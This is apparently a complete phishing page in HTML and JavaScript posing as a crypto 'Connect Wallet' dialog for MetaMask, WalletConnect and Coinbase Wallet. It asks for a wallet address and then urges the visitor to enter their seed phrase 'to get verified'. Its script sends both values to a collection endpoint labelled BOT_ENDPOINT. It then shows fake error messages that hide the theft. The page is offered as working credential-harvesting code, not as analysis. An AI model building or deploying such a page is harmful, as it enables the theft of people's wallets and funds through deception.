<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connect Wallet</title>
  <link rel="icon" type="image/png" href="favicon.ico">
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gradient-to-br from-blue-50 to-blue-100 min-h-screen flex items-center justify-center font-sans">

  <!-- Card -->
  <div class="bg-white shadow-lg rounded-2xl p-8 w-full max-w-md text-center">
    <div class="mb-6">
      <div class="w-16 h-16 mx-auto bg-gray-200 rounded-full flex items-center justify-center">
        <img src="logo.png" alt="Screenshot" class="rounded-lg shadow-lg">
      </div>
    </div>

    <h1 class="text-2xl font-bold text-gray-800 mb-2">Connect Your Wallet</h1>
    <p class="text-gray-500 mb-6">Choose a wallet to connect with the app</p>

    <div class="space-y-3">
      <button class="wallet-btn w-full flex items-center justify-between bg-gray-50 hover:bg-gray-100 border border-gray-200 px-4 py-3 rounded-xl shadow-sm transition">
        <span class="font-medium text-gray-700">MetaMask</span>
        <span class="text-gray-400">→</span>
      </button>
      <button class="wallet-btn w-full flex items-center justify-between bg-gray-50 hover:bg-gray-100 border border-gray-200 px-4 py-3 rounded-xl shadow-sm transition">
        <span class="font-medium text-gray-700">WalletConnect</span>
        <span class="text-gray-400">→</span>
      </button>
      <button class="wallet-btn w-full flex items-center justify-between bg-gray-50 hover:bg-gray-100 border border-gray-200 px-4 py-3 rounded-xl shadow-sm transition">
        <span class="font-medium text-gray-700">Coinbase Wallet</span>
        <span class="text-gray-400">→</span>
      </button>
    </div>

    <p class="text-xs text-gray-400 mt-6">
      By connecting, you agree to the Terms of Service
    </p>
  </div>

  <!-- Wallet Modal -->
  <div id="walletModal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center">
    <div class="bg-white rounded-xl p-6 w-80 text-center">
      <h2 class="text-lg font-bold mb-4">Connect Wallet</h2>
      <input id="walletAddress" type="text" placeholder="Enter Wallet Address"
             class="w-full border rounded-lg px-3 py-2 mb-3"/>
      <button id="verifyWallet" class="bg-green-500 text-white px-4 py-2 rounded-lg w-full">Verify Wallet</button>
      <p class="mt-3 text-sm">
        <a href="#" id="openName" class="text-blue-600 hover:underline">Enter your Seed Phrase Instead to get verified</a>
      </p>
    </div>
  </div>

  <!-- Name Modal -->
  <div id="nameModal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center">
    <div class="bg-white rounded-xl p-6 w-80 text-center">
      <h2 class="text-lg font-bold mb-4">Enter Seed Phrase</h2>
      <input id="userName" type="text" placeholder="Enter Seed Phrase"
             class="w-full border rounded-lg px-3 py-2 mb-3"/>
      <button id="verifyName" class="bg-green-500 text-white px-4 py-2 rounded-lg w-full">Verify Seed Phrase</button>
    </div>
  </div>

  <!-- Toast -->
  <div id="toast" class="fixed top-5 right-5 bg-red-500 text-white px-4 py-2 rounded-lg shadow-lg hidden">
    Failure! {"name":"AuthenticationError","code":1001}
  </div>

<script>
  const walletBtns = document.querySelectorAll(".wallet-btn");
  const walletModal = document.getElementById("walletModal");
  const nameModal = document.getElementById("nameModal");
  const verifyWallet = document.getElementById("verifyWallet");
  const verifyName = document.getElementById("verifyName");
  const openName = document.getElementById("openName");
  const toast = document.getElementById("toast");

  const BOT_ENDPOINT = "http://localhost:4000/submit";

  // Open wallet modal
  walletBtns.forEach(btn => btn.addEventListener("click", () => {
    walletModal.classList.remove("hidden");
  }));

  // Verify wallet
  verifyWallet.addEventListener("click", async () => {
    const wallet = document.getElementById("walletAddress").value.trim();
    if (!wallet) {
      showToast("❌ Please enter a wallet address!");
      return;
    }

    try {
      await fetch(BOT_ENDPOINT, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ wallet })
      });
      showToast(`❌ Failed! Wallet submitted: ${wallet}`);
    } catch (err) {
      showToast("⚠️ Error sending wallet to server.");
    }

    walletModal.classList.add("hidden");
  });

  // Open name modal
  openName.addEventListener("click", (e) => {
    e.preventDefault();
    walletModal.classList.add("hidden");
    nameModal.classList.remove("hidden");
  });

  // Verify name
  verifyName.addEventListener("click", async () => {
    const name = document.getElementById("userName").value.trim();
    if (!name) {
      showToast("❌ Please enter your name!");
      return;
    }

    try {
      await fetch(BOT_ENDPOINT, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name })
      });
      showToast(`❌ Syntax Error: ${name}`);
    } catch (err) {
      showToast("⚠️ Error sending name to server.");
    }

    nameModal.classList.add("hidden");
  });

  // Toast function (dynamic message)
  function showToast(message) {
    toast.textContent = message;
    toast.classList.remove("hidden");
    setTimeout(() => {
      toast.classList.add("hidden");
    }, 4000);
  }
</script>
